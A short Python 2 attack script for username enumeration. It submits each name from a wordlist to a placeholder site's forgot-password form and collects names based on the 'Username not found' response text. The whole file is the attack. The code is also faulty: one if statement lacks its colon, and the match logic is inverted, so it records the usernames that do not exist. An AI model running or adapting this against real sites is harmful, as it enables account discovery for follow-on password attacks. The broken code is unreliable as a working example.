#brute force username enumeration
import sys
import urllib
import urllib2

if len(sys.argv) !=2:
    print "usage: %s filename" % (sys.argv[0])
    sys.exit(0)

filename=str(sys.argv[1])
userlist = open(filename,'r')
url = "http://www.vulnerablesite.com/forgotpassword.html"
foundusers = []
UnknownStr="Username not found"

for user in userlist:
	user=user.rstrip()
	data = urllib.urlencode({"username":user})
	request = urllib2.urlopen(url,data)
	response = request.read()

	if(response.find(UnknownStr)>=0)
		foundusers.append(user)
	request.close()

if len(foundusers)>0:
	print "Found Users:\n"
	for name in foundusers:
		print name+"\n"
else:
	print "No users found\n"

